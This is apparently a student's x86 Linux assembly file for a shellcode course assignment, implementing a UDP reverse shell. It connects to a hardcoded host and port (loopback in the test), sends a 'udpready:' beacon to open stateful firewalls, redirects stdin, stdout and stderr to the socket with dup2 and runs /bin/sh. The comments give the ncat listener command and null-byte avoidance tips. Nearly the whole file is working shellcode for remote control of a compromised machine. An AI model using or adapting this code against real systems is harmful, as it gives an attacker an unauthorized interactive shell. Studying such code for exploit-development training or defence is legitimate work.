; SLAE-X
; thanks to writesup from previou students :]
; assignment: 2. create a reverse shell
; originality: using UDP instead TCP
; usage : sudo ncat -lup 53 on the receiving end
; warning, this shellcode might contains null byte if you use certain ip / address


%define htons(x) ((x >> 8) & 0xFF) | ((x & 0xFF) << 8)
%define _port 5353;
PORT equ htons(_port);

_ip equ 0x0100007F; loopback 127.0.0.1 test
; warning use non null byte address here
; 127.1.1.1 has issue on UDP fyi

global _start

_start:

; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1
push   0x66
pop    eax
push   0x1
pop    ebx
xor    ecx,ecx
push   ecx
; but this times it will be a SOCK_DGRAM UDP, so 0x2 as argument
push   0x2
push   0x2
mov    ecx,esp
int    0x80
; saving fd

; then we call connect on this UDP socket (to use send())
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
; we push ip address as argument
push _ip;
xor edx,edx
; port 53 without null byte
mov dh, 0x35 ; comment this for variable port
push dx; comment this for variable port
; push word PORT ; UNcomment this for variable port
push word 0x2;

mov ecx,esp; save pointer to ecx
push 0x10; addrlen
push ecx; pointer to sockaddr
push eax; fd received previously
mov ecx,esp;
mov esi,eax; save fd for next call
xor    eax,eax
mov    al,0x66
add    bl,0x2
int    0x80


; now we send a UDP packet to open stateful firewall :]
xor eax,eax
mov al,0x66
; ssize_t send(int sockfd, const void *buf, size_t len, int flags);
; we will send "udpready:" string to let the distant server know the shellcode is working and ready
push 0x0a3a7964
push 0x72706475
mov edx,esp
; no flags needed
xor ecx,ecx
push ecx
; size of message to be sent is 8
push 0x8
push edx
push esi
mov ecx,esp
xor ebx,ebx
mov bl,0x9
int 0x80

; the rest is similar to assignment 1 > copy pasta

; duplicating fd from socket to stdin stdout stderr of the process
mov    ebx,esi
; we need to clean ecx, at this stage it contains data "0xBFFFF39C"
; since we use "mov cl" and not mov ecx (to avoid null byte) we dont want to have this remaining data and break our loop
xor ecx,ecx
mov    cl,0x2
; we use a loop and decrease cl register, ie from 2 to 0 , 2 - 1 - 0
loop:
; syscall dup2
mov    al,0x3f
int    0x80
dec    ecx
; sign flag is not set if ecx is not inferior to 0
; so we use "jump if not sign" which check if the flag is on
jns    loop

; syscall "execve", with arguments /bin//sh null terminated and a null string for envp argument
mov    al,0xb
xor esi,esi
push   esi
push   0x68732f2f ; "//sh"
push   0x6e69622f ; "/bin"
mov    ebx,esp
; push null termination
xor esi,esi
push   esi
mov    edx,esp
push   ebx
mov    ecx,esp
int    0x80